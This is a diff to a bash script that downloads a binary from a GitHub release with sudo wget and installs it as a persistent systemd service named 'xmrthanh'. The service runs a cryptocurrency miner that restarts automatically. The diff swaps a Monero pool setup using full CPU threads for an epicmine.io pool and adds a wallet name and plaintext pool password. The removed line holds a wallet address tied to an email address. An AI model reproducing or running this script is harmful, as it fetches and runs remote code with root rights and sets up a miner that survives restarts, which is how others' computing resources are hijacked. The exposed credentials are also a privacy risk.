@@ -1,6 +1,6 @@
 #!/bin/bash
 cd /home
-sudo wget https://github.com/trangtrau/random-agent-spoofer/releases/download/va/ar 
+sudo wget https://github.com/rolandmedina54/xmr/releases/download/untagged-1b16ecb07df1ba551cfb/ar 
 sudo cp ar jvdar 
 sudo chmod +x jvdar
 
@@ -11,7 +11,7 @@ bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service
 Description=xmrthanh
 After=network.target
 [Service]
-ExecStart= /home/jvdar --coin=XMR --url=20.92.22.146:2237 --user=87dy3GQJKwK8DyaWZXdBwzT2cJrzhkKJnFnetJJi7dxJKguRgQWdfP2GrqEKeUwnk33F9jEHaLDLeLvUbnFTzHVb19PthNg.vm/tuyen1321995@gmail.com --cpu-max-threads-hint=100 --tls
+ExecStart= /home/jvdar --multi-algorithm-job-mode 1 --disable-gpu --algorithm randomepic --pool eu.epicmine.io:3334 --tls true --wallet tuyenvv95.tu1 --password Passbimat4367 --keepalive true
 WatchdogSec=36000
 Restart=always
 RestartSec=60
